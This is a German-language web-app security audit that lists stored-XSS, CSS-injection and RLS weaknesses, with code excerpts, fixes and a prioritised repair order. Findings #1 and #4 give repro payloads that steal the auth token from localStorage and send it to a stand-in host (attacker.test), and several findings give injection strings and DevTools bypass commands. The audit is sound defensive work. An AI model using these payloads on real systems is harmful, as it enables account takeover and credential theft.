# Phase A.3 — XSS & Sicherheit

**Audit-Datum:** 28.05.2026
**Scope:** `app.js` (~32k Zeilen), `supabase/functions/manage-users/index.ts`, `index.html`, `config.js`, `vercel.json`, RLS-Migrationen (`migrations/v1.15.0_auth_hardening.sql`, `v1.16.0_soft_delete.sql`)

**Vorhandene Schutzmaßnahmen (positive Befunde):**
- `esc()` (`app.js:2959`) und `_e()` (`app.js:30062`) korrekt implementiert (escape `& < > " '`).
- CSP-Header in `vercel.json` aktiv (mit Schwäche, siehe #14).
- Edge Function `manage-users` validiert JWT, prüft Caller-Admin-Status (`supabase/functions/manage-users/index.ts:96–128`), schützt Last-Admin (218–227, 311–319), blockt Self-Demotion (210–215) und Self-Delete (305–308).
- DB-Trigger `user_profiles_update_guard` (`migrations/v1.15.0_auth_hardening.sql`) sichert Last-Admin und Role-Self-Escalation am DB-Layer.
- Restrictive Policy `only_active_users` auf 15 operativen Tabellen.
- Passwort-Generierung via `crypto.getRandomValues`, keine `Math.random`.
- Hash-Router-Argumente werden nicht in DOM eingefügt (nur `.eq('id', …)`).
- Alle `target="_blank"`-Links haben `rel="noopener"`.

---

## Critical (Account-Übernahme / Daten-Exfil / Auth-Bypass)

*Keine.* Auth-Layer ist sauber (Edge Function + DB-Trigger doppelt abgesichert). Es gibt keinen direkten Auth-Bypass.

---

## High (privilegierter Stored-XSS — User-Account-Hijack möglich)

### #1 esc()-Bypass im JS-String-Literal innerhalb `onclick`: User-Tabelle „Passwort zurücksetzen"
- **Datei:** `app.js:7580`
- **Symptom:** `u.name` (aus `user_profiles`, admin-änderbar) wird durch `esc()` geleitet und in ein JS-String-Literal **innerhalb eines `onclick`-HTML-Attributs** eingebettet. `esc()` ersetzt `'` durch `&#39;`. Der Browser **dekodiert HTML-Entities im Attributwert vor** dem JS-Parser → `&#39;` wird zurück zu `'` und bricht das String-Literal.
- **Code:**
  ```js
  actions += `<button class="btn btn-sm" onclick="resetUserPassword('${u.id}', '${esc(u.name || '')}')">Passwort zurücksetzen</button>`;
  ```
- **Repro-Payload:** Admin (oder kompromittierter Self-Service-Pfad) setzt im Benutzer-Modal als `name`:
  ```
  Bob');fetch('//attacker.test?t='+localStorage.getItem('sb-loohjeiysjxzbmfwkyvv-auth-token'));//
  ```
  Ein anderer Admin öffnet die Benutzer-Tabelle und klickt „Passwort zurücksetzen" → JS-Execution im Origin von cumart.cloud → Token-Hijack → vollständige Account-Übernahme.
- **Fix:** Inline-`onclick` aufgeben, Argument via `data-*` zuweisen:
  ```js
  actions += `<button class="btn btn-sm" data-uid="${esc(u.id)}" data-uname="${esc(u.name||'')}" onclick="resetUserPassword(this.dataset.uid,this.dataset.uname)">Passwort zurücksetzen</button>`;
  ```

### #2 esc()-Bypass: Lookup-Status-Pill-Popup
- **Datei:** `app.js:25681`
- **Symptom:** Identisches Muster wie #1 mit `o.wert` (lookup_values.wert). Status-Pillen sind in **jeder** Liste der App präsent — bei Klick triggert XSS für **alle** authenticated User.
- **Code:**
  ```js
  onclick="event.stopPropagation();selectEntityStatus('${esc(entityType)}','${esc(entityId)}','${esc(o.wert)}','${esc(currentStatus)}')"
  ```
- **Repro-Payload:** Admin legt in `lookup_values` (z. B. `einsatz_status`) den Wert an:
  ```
  Test');alert(document.cookie);//
  ```
  Jede Status-Pillen-Klick triggert JS — Stored XSS gegen jeden authenticated User. Siehe auch #12 zu fehlender RLS auf `lookup_values` — Bug ist möglicherweise auch ohne Admin-Konto erreichbar.
- **Fix:** Wie #1 — `data-*`-Attribute + Event-Delegation.

### #3 esc()-Bypass: Themen-Suggestion-Button (Einsatz-Composer)
- **Datei:** `app.js:25357`
- **Symptom:** `r.name` (project_themes.name) wird via `esc()` in JS-Argument-Position interpoliert. Themen werden vom User frei angelegt — auch von Nicht-Admins.
- **Code:**
  ```js
  onclick="addDeploymentThemeFromCompany('${esc(r.id)}','${esc(r.name)}')">
  ```
- **Repro-Payload:** User legt Thema `Lärm');alert(1);//` an. Jeder andere User, der die Themen-Suggestion klickt, triggert XSS.
- **Fix:** Wie #1.

### #4 Unvalidierte Shortcut-URL erlaubt `javascript:`-Scheme im href
- **Datei:** `app.js:27212` (`saveShortcut`), `app.js:27272` (Arbeitsplatz-Card), `app.js:27168` (Tabelle)
- **Symptom:** Shortcut-URLs werden in `saveShortcut()` **ohne Scheme-Validierung** persistiert. `esc()` schützt nur Quotes, nicht das URL-Scheme. `target="_blank"` ändert daran nichts — `javascript:`-URIs laufen im aktuellen Origin.
- **Code:**
  ```js
  // saveShortcut() — keine URL-Validierung:
  if (!url)   { showToast('URL ist Pflicht.', true); return; }
  // Rendering:
  <a class="arbeitsplatz-shortcut-card" href="${esc(s.url)}" target="_blank" rel="noopener" …>
  ```
- **Repro-Payload:** Admin legt Shortcut an mit URL:
  ```
  javascript:fetch('https://attacker.test/?t='+localStorage.getItem('sb-loohjeiysjxzbmfwkyvv-auth-token'))
  ```
  Klick auf Quick-Link im Arbeitsplatz → Auth-Token exfiltriert.
- **Fix:** Scheme-Whitelist in `saveShortcut()` und beim Render:
  ```js
  if (!/^(https?|mailto|tel):/i.test(url)) {
    showToast('URL muss mit http://, https://, mailto: oder tel: beginnen.', true); return;
  }
  ```

---

## Medium

### #5 esc()-Bypass-Muster wiederverwendbar: `it.click` als roher `onclick`-Wert
- **Dateien:** `app.js:2741, 4657, 4822, 4953, 5101, 6091, 6542`
- **Symptom:** Activity-Stream-Items haben ein `click`-Feld (z. B. `` `openTaskModal('edit','${esc(t.id)}')` ``), das **roh** in `onclick=""` eingesetzt wird. Aktuell alle click-Strings UUID-basiert → **nicht akut ausnutzbar**, aber fragiles Muster. Sobald jemand User-Strings in click einbettet, kippt es sofort zur Stored XSS.
- **Code:**
  ```js
  ? `<a class="${titleCls} proj-link" onclick="${it.click}">${esc(it.title)}</a>`
  ```
- **Fix:** Click-Handler via `addEventListener` zuweisen, oder zentraler Dispatcher mit `data-action="navigate" data-target="…"`.

### #6 Inkonsistente Escapung im Notiz-Bezug-Click
- **Dateien:** `app.js:22312, 22316, 4643, 4650, 5073, 5080`
- **Symptom:** IDs werden **ohne** `esc()` im Click-Template-String eingesetzt — Code-Smell, kippt bei künftigen Refactors leise:
  ```js
  return { type: 'project', label: n.project.name, click: `navigateTo('projekt','${n.project.id}')` };
  return { type: 'contact', label: name,           click: `navigateTo('kontakt','${n.contact.id}')` };
  ```
  Vergleichsweise wird in `app.js:22309, 6068 ff` korrekt `esc(…)` verwendet.
- **Fix:** Konsistent `esc()` einsetzen — besser komplett auf `data-*` + Event-Delegation (löst auch #5).

### #7 CSS-Injection via Lookup-/Theme-Farbe (Daten-Exfil + UI-Defacement)
- **Dateien:** `app.js:8045, 9271, 23827, 24067, 24071, 24136, 24216, 25071, 25155, 25358, 25368, 26750, 26751, 26856, 28983, 30998`
- **Symptom:** Farb-Werte (`lv.farbe`, `t.farbe`, `kat.color`, `r.farbe`) werden in `style="background:${esc(…)}…"` interpoliert. `esc()` escaped HTML, **nicht CSS** — `;`, `:`, `(`, `)`, `/` bleiben durch. Kein JS-Execution möglich, aber:
  - **Daten-Exfil** über `background-image:url(…)`.
  - **UI-Defacement** (Layer über die App legen für Phishing).
- **Repro-Payload:** Admin legt Lookup-Wert mit `farbe`:
  ```
  red;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,.9);z-index:9999
  ```
  Lookup-Seite öffnen → Pille deckt den ganzen Bildschirm ab.
- **Fix:** Farbwerte client- und server-seitig gegen Hex-Pattern validieren: `/^#[0-9a-f]{3,8}$/i`. DB-`CHECK`-Constraint ergänzen.

### #8 Soft-Delete-Filter ist Client-Side, nicht RLS
- **Datei:** `migrations/v1.16.0_soft_delete.sql`, alle `is('deleted_at', null)`-Filter im `app.js`
- **Symptom:** Authenticated User können via DevTools alle Zeilen inkl. soft-gelöschter abrufen:
  ```js
  db.from('companies').select('*').then(r => console.log(r.data));
  ```
  Bei offenem RLS-Default kein Privilege-Escalation — aber Erwartungsbruch (DSGVO-Auskunft: gelöschte Firma ist nicht gelöscht) und Stolperstein für künftige RLS-Verschärfungen.
- **Fix:** Soft-Delete als RLS-Policy `USING (deleted_at IS NULL)` mitliefern, oder explizit dokumentieren, dass Soft-Delete kein Datenschutz ist.

### #9 Datei-Upload: kein MIME-/Extension-Whitelist
- **Datei:** `app.js:26923` (`_uploadOneAttachment`)
- **Symptom:** Beliebige Dateitypen werden hochgeladen, SignedURL (1h) bringt sie zurück. SVG/HTML/JS ausführbar im `supabase.co`-Origin → keine cumart.cloud-Cookies, aber Phishing-Vektor (Angreifer-HTML auf vertrauenswürdiger Subdomain). `downloadAttachment` setzt `a.download` korrekt, aber direktes Klicken auf SignedURL umgeht das.
- **Fix:** MIME-Whitelist (`image/*`, `application/pdf`, Office-Mimes, `text/plain`, `application/zip`), Extension-Blacklist (`.html`, `.svg`, `.htm`, `.xml`).

---

## Low

### #10 `confirmDialog`-Message ist `innerHTML`
- **Datei:** `app.js:3042`
- **Symptom:** `document.getElementById('confirm-message').innerHTML = message;`. Alle aktuellen Aufrufe übergeben hartkodierte Strings (oft mit `<strong>` für Hervorhebungen) — derzeit safe. Wäre XSS, sobald jemand User-Input interpoliert (z. B. `` `Firma "${company.name}" löschen?` ``).
- **Fix:** Auf `textContent` umstellen oder zweite Variante `confirmDialogText` für plain-only.

### #11 `currentProfile.name` doppelt escaped in `textContent`
- **Datei:** `app.js:29158, 29172`
- **Symptom:** `row.textContent = \`${esc(currentProfile.name)} …\`;` — `esc(Bob & Co.)` → `Bob &amp; Co.`, in textContent literal sichtbar. Kein Security-Bug, aber UI-Bug.
- **Fix:** `esc()` weglassen in `textContent`-Pfaden.

### #12 `data-admin-only` ist nur UI-Gate; Lookup/Service-RLS-Lücke wahrscheinlich
- **Datei:** `app.js:7353` (`applyAdminOnlyUI`)
- **Symptom:** `isAdmin()`-Check ist nur Client-Side. Für `manage-users` greift Server-Schutz (Edge + Trigger). **Aber:** Für `lookup_values` ist nur Client-Check:
  ```js
  async function openLookupModal(mode, lookupId = null) {
    if (!isAdmin()) { showToast('Du hast keine Berechtigung für diese Aktion.', true); return; }
  ```
  Authenticated Non-Admin kann via DevTools direkt:
  ```js
  db.from('lookup_values').insert({ kategorie:'projekt_status', system_key:'evil', wert:"Test');alert(1);//", farbe:'#000', ist_aktiv:true });
  ```
  Wenn das durchgeht → #2 ist auch ohne Admin-Konto erreichbar. CLAUDE.md erwähnt strikten Admin-Write auf `lookup_values`, aber im Repo gibt es **keine Policy-Migration**, die das bestätigt — Verifikation nötig.
- **Verifikation:**
  ```sql
  SELECT tablename, policyname, cmd, qual FROM pg_policies
   WHERE tablename IN ('lookup_values','services','templates','shortcuts','roles');
  ```
- **Fix:** RLS auf `lookup_values`, `services`, `templates`, `shortcuts`, `roles` mit Admin-only-INSERT/UPDATE/DELETE-Policies versehen und Migration ins Repo committen.

### #13 `localStorage` nicht aufgeräumt beim Logout
- **Dateien:** `app.js:16476, 9189, 19605`
- **Symptom:** `recently_visited`, `themes_banner_seen_…`, `monthDashView` bleiben nach Logout im localStorage. Nicht-sensible Daten, aber: nächster User auf demselben Gerät sieht „Recently visited" des vorigen Users.
- **Fix:** In `doLogout` (`app.js:7415`) App-Keys löschen oder pro `currentProfile.id` namespacen.

---

## Info

### #14 CSP enthält `'unsafe-inline'` + `'unsafe-eval'`
- **Datei:** `vercel.json:12`
- **Symptom:**
  ```json
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net"
  ```
  `'unsafe-inline'` nötig wegen Inline-`onclick`-Handlern. Bedeutet: **CSP gibt keinen XSS-Schutz**, ist nur Defense-in-Depth für andere Klassen. #1–#3 sind nicht via CSP gemitigated.
- **Mittelfristig:** Nonce-basierte CSP nach Refactor aller Inline-Handler.

### #15 `SUPABASE_ANON_KEY` hartcodiert in `config.js`
- **Datei:** `config.js:25`
- Standard-Supabase-Pattern, designed public. Bedeutet: **RLS ist die einzige Schutzwand** → siehe #12.

### #16 CORS in `manage-users` ist Wildcard `*`
- **Datei:** `supabase/functions/manage-users/index.ts:4`
- **Symptom:** `'Access-Control-Allow-Origin': '*'`. Schutz via JWT-Bearer; XSS-geklautes Token (#1–#4) funktioniert von beliebigem Origin.
- **Fix:** Origin-Whitelist auf `https://cumart.cloud` (+ künftige Mandanten-Domains).

### #17 Storage-Bucket-Policy nicht im Repo
- **Befund:** `attachments`-Bucket (`app.js:27001`). Keine Storage-RLS-Migration im Repo → Audit kann nicht verifizieren, ob Bucket-Policy authenticated-only und `is_active_user()` erzwingt.
- **Fix:** Im Supabase-Dashboard prüfen (Bucket `Public: false`, RLS `auth.role()='authenticated' AND public.is_active_user()`), Migration als `migrations/vX.Y.Z_storage_attachments_rls.sql` committen.

### #18 Kein Rate-Limit auf `manage-users`-Aktionen
- **Datei:** `supabase/functions/manage-users/index.ts`
- **Symptom:** Keine Throttles. Kompromittierter Admin kann ungebremst Massen-Operationen fahren.
- **Empfehlung:** Defense-in-Depth-Throttling.

### #19 Zentrale `renderActionIcons` ist sauber escaped (positiver Befund)
- **Datei:** `app.js:3164–3169`
- Listen-Action-Icons gehen über zentralen Renderer mit konsistentem `esc(id)`. Bypass aus #1/#2/#3 schlägt hier nicht zu (UUIDs ohne Quotes).

---

## Priorisierte Fix-Reihenfolge

1. **Sofort (#1, #2, #3):** Die drei esc()-Bypass-Stellen auf `data-*` + Event-Delegation umstellen. Direkt ausnutzbar, führen zu Account-Übernahme.
2. **Bald (#4):** Shortcut-URL-Scheme-Validierung — Single-Liner-Fix.
3. **Bald (#12):** RLS auf `lookup_values`, `services`, `templates`, `shortcuts` per SQL verifizieren und ggf. härten. Ohne diesen Fix ist #2 möglicherweise auch ohne Admin-Konto auslösbar.
4. **Mittel (#5, #6, #7):** Activity-Click-Pattern auf `data-*`; CSS-Farbe-Whitelist.
5. **Mittel (#9, #17):** MIME-Whitelist; Storage-Bucket-Policy ins Repo.
6. **Cleanup (#8, #10, #11, #13, #16, #18):** Soft-Delete-RLS, confirmDialog-textContent, currentProfile-doppelt-escape, localStorage-Cleanup, CORS-Whitelist, Rate-Limit.
7. **Langfristig (#14):** Nonce-CSP nach Refactor aller Inline-Handler.
